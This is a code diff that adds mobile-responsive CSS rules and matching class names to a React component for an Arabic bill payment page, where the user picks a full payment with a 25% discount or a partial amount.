@@ -59,6 +59,27 @@ export default function SelectAmount() {
     @font-face { font-family: 'SE'; src: url('/fonts/SE-Medium.woff2') format('woff2'); font-weight: 500; }
     @font-face { font-family: 'SE'; src: url('/fonts/SE-SemiBold.woff2') format('woff2'); font-weight: 600; }
     @font-face { font-family: 'SE'; src: url('/fonts/SE-Light.woff2') format('woff2'); font-weight: 300; }
+    @media (max-width: 480px) {
+      .sa-header { padding: 10px 16px !important; height: auto !important; flex-wrap: wrap !important; gap: 8px !important; }
+      .sa-header img { width: 65px !important; height: 42px !important; }
+      .sa-stepper { padding: 4px 6px !important; gap: 0 !important; }
+      .sa-stepper > div { padding: 6px 10px !important; font-size: 12px !important; }
+      .sa-stepper > div span { font-size: 11px !important; }
+      .sa-step-active { padding: 6px 12px !important; font-size: 12px !important; }
+      .sa-step-active span { width: 18px !important; height: 18px !important; font-size: 11px !important; }
+      .sa-title-section { padding-top: 24px !important; padding-bottom: 24px !important; }
+      .sa-title-section h1 { font-size: 24px !important; }
+      .sa-title-section p { font-size: 14px !important; }
+      .sa-options { padding: 0 16px !important; }
+      .sa-option { padding: 14px 14px !important; }
+      .sa-option-label { font-size: 14px !important; }
+      .sa-price { font-size: 15px !important; }
+      .sa-price-old { font-size: 12px !important; }
+      .sa-discount-badge { font-size: 10px !important; padding: 2px 6px !important; }
+      .sa-bottom-bar { padding: 12px 16px !important; }
+      .sa-next-btn { padding: 12px 30px !important; font-size: 16px !important; width: 100% !important; }
+      .sa-close-btn { width: 38px !important; height: 38px !important; }
+    }
   `;
 
   return (
@@ -67,7 +88,7 @@ export default function SelectAmount() {
       <div className="min-h-screen bg-white" dir="rtl" style={{ fontFamily: "'SE', sans-serif" }}>
 
         {/* Header */}
-        <div style={{
+        <div className="sa-header" style={{
           display: 'flex', alignItems: 'center', justifyContent: 'space-between',
           height: '70px', padding: '15px 30px 14px',
         }}>
@@ -76,12 +97,12 @@ export default function SelectAmount() {
           </a>
 
           {/* Stepper */}
-          <div style={{
+          <div className="sa-stepper" style={{
             display: 'flex', alignItems: 'center', gap: '0',
             background: '#f5f7fa', borderRadius: '30px', padding: '6px 8px',
           }}>
             {/* Step 1 - Active */}
-            <div style={{
+            <div className="sa-step-active" style={{
               display: 'flex', alignItems: 'center', gap: '8px',
               background: '#06c', borderRadius: '24px', padding: '8px 20px',
               color: '#fff', fontSize: '14px', fontWeight: 500,
@@ -117,7 +138,7 @@ export default function SelectAmount() {
           </div>
 
           {/* Close Button */}
-          <button onClick={() => setLocation("/bill")} style={{
+          <button className="sa-close-btn" onClick={() => setLocation("/bill")} style={{
             background: '#e8f0fe', border: 'none', cursor: 'pointer', padding: '10px',
             display: 'flex', alignItems: 'center', justifyContent: 'center',
             borderRadius: '12px', width: '44px', height: '44px',
@@ -130,7 +151,7 @@ export default function SelectAmount() {
         </div>
 
         {/* Title */}
-        <div style={{ textAlign: 'center', paddingTop: '50px', paddingBottom: '40px' }}>
+        <div className="sa-title-section" style={{ textAlign: 'center', paddingTop: '50px', paddingBottom: '40px' }}>
           <p style={{ color: '#06c', fontSize: '16px', fontWeight: 400, marginBottom: '8px' }}>عرض ودفع الفواتير</p>
           <h1 style={{ color: '#001f5e', fontSize: '36px', fontWeight: 600, letterSpacing: '1px', direction: 'ltr', display: 'inline-block' }}>
             {accountNumber}
@@ -138,13 +159,14 @@ export default function SelectAmount() {
         </div>
 
         {/* Payment Options */}
-        <div style={{ maxWidth: '600px', margin: '0 auto', padding: '0 30px' }}>
+        <div className="sa-options" style={{ maxWidth: '600px', margin: '0 auto', padding: '0 30px' }}>
           <label style={{ display: 'block', color: '#66799e', fontSize: '15px', fontWeight: 400, marginBottom: '16px', textAlign: 'right' }}>
             مبلغ السداد
           </label>
 
           {/* Option 1: Full Amount */}
           <div
+            className="sa-option"
             onClick={() => setPayOption("full")}
             style={{
               display: 'flex', alignItems: 'center', justifyContent: 'space-between',
@@ -168,18 +190,18 @@ export default function SelectAmount() {
                   <div style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#06c' }}></div>
                 )}
               </div>
-              <span style={{ fontSize: '16px', fontWeight: 500, color: '#001f5e' }}>دفع كامل المبلغ</span>
+              <span className="sa-option-label" style={{ fontSize: '16px', fontWeight: 500, color: '#001f5e' }}>دفع كامل المبلغ</span>
             </div>
             <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', gap: '4px' }}>
               <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-                <span style={{ fontSize: '14px', fontWeight: 400, color: '#8e99a4', direction: 'ltr', textDecoration: 'line-through' }}>
+                <span className="sa-price-old" style={{ fontSize: '14px', fontWeight: 400, color: '#8e99a4', direction: 'ltr', textDecoration: 'line-through' }}>
                   {fullAmount} ر.س
                 </span>
-                <span style={{ fontSize: '12px', fontWeight: 600, color: '#fff', background: '#e53935', borderRadius: '6px', padding: '2px 8px' }}>
+                <span className="sa-discount-badge" style={{ fontSize: '12px', fontWeight: 600, color: '#fff', background: '#e53935', borderRadius: '6px', padding: '2px 8px' }}>
                   خصم 25%
                 </span>
               </div>
-              <span style={{ fontSize: '18px', fontWeight: 600, color: '#06c', direction: 'ltr' }}>
+              <span className="sa-price" style={{ fontSize: '18px', fontWeight: 600, color: '#06c', direction: 'ltr' }}>
                 {discountedAmount} ر.س
               </span>
             </div>
@@ -187,6 +209,7 @@ export default function SelectAmount() {
 
           {/* Option 2: Partial Amount */}
           <div
+            className="sa-option"
             onClick={() => setPayOption("partial")}
             style={{
               padding: '16px 18px',
@@ -208,7 +231,7 @@ export default function SelectAmount() {
                   <div style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#06c' }}></div>
                 )}
               </div>
-              <span style={{ fontSize: '16px', fontWeight: 500, color: '#001f5e' }}>دفع جزء من المبلغ</span>
+              <span className="sa-option-label" style={{ fontSize: '16px', fontWeight: 500, color: '#001f5e' }}>دفع جزء من المبلغ</span>
             </div>
 
             {payOption === "partial" && (
@@ -244,13 +267,14 @@ export default function SelectAmount() {
         </div>
 
         {/* Bottom Button */}
-        <div style={{
+        <div className="sa-bottom-bar" style={{
           position: 'fixed', bottom: 0, left: 0, right: 0,
           padding: '16px 30px', background: 'white',
           borderTop: '1px solid #e8ecf1',
           display: 'flex', justifyContent: 'flex-end',
         }}>
           <button
+            className="sa-next-btn"
             onClick={handleNext}
             disabled={!isValid}
             style={{
